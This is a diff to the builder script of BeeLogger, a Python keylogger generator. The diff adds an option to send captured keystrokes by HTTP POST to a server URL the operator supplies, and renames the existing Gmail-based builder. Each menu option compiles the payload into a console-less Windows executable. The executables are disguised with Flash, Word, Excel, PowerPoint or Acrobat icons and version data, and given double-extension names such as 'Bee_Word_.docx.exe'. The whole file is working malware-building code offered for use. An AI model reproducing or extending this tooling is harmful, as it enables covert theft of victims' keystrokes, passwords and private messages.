@@ -12,7 +12,34 @@ if not os.geteuid() == 0:
     sys.exit('BeeLogger must be run as root')
 def clear():
     os.system('clear')
-def begin():
+def begin_http():
+    os.system('sudo rm -Rf dist')
+# TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
+    serverURL = raw_input('Type the server URL to post data to: ')
+    postData = raw_input('Type the POST data format ($KeyStream$=the keys stream, $Date$-date): ')
+    print '\n'
+    print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
+    print '\n   serverURL: ' + serverURL
+    print '   postData: ' + postData 
+    print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
+    print '\n'    
+    ask = raw_input('These info above are correct? (y/n) :')
+    if ask == 'y':
+        pass
+    else:
+        begin_http()
+    template = open('Templates/Bee_POST.py', 'r')
+    o = template.read()
+    payload = '#/usr/bin/python\n'
+    payload += '# -*- coding: utf-8 -*-\n'
+    payload += 'SERVER_URL = ' + "'" + serverURL + "'" + '\n'
+    payload += 'POST_DATA = ' + "'" + postData + "'" + '\n'
+    payload += str(o)
+    with open('k.py', 'w') as f:
+        f.write(payload)
+        f.close()	
+    template.close()
+def begin_mail():
     os.system('sudo rm -Rf dist')
 # TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
     email = raw_input('Type your gmail to receive logs: ')
@@ -27,8 +54,8 @@ def begin():
     if ask == 'y':
         pass
     else:
-        begin()
-    template = open('Templates/Bee.py', 'r')
+        begin_mail()
+    template = open('Templates/Bee_MAIL.py', 'r')
     o = template.read()
     payload = '#/usr/bin/python\n'
     payload += '# -*- coding: utf-8 -*-\n'
@@ -90,7 +117,7 @@ def main():
                 print '\n NOTE: Don\'t use your personal email, make a dedicated.'
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee.exe'
@@ -100,7 +127,7 @@ def main():
                 os.system('sudo rm -Rf Templates/k_enc.py')
                 print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice == '1':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Flash_.exe'
@@ -109,7 +136,7 @@ def main():
                 heading()                              
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name           
             elif choice == '2':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Word_.docx.exe'
@@ -118,7 +145,7 @@ def main():
                 heading()                                              
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '3':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Excel_.xlsx.exe'
@@ -127,7 +154,7 @@ def main():
                 heading()                                              
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '4':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Power_.pptx.exe'
@@ -136,7 +163,7 @@ def main():
                 heading()                                              
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '5':
-                begin()
+                begin_http()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_AcrobatPDF_.pdf.exe'
